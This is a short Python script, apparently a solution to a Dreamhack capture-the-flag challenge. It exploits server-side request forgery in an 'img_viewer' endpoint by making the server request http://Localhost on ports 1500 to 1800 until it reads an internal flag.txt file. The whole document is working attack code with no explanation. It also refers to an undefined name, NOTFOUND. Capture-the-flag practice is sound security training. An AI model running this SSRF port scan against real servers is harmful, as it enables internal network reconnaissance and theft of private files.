import requests
import time

for port in range(1500, 1801):
    url = f'http://host3.dreamhack.games:22602/img_viewer'
    img_url = f'http://Localhost:'+str(port)+'/flag.txt'
    data = { "url" : img_url }
    response = requests.post(url, data).text
    time.sleep(1)
    if NOTFOUND in response:
        print(str(port), 'is not port')
    else:
        print(str(port), 'is port !!!!!!!!!!!!!!!!!!!!!!!!!!!')
        print(response)
        break
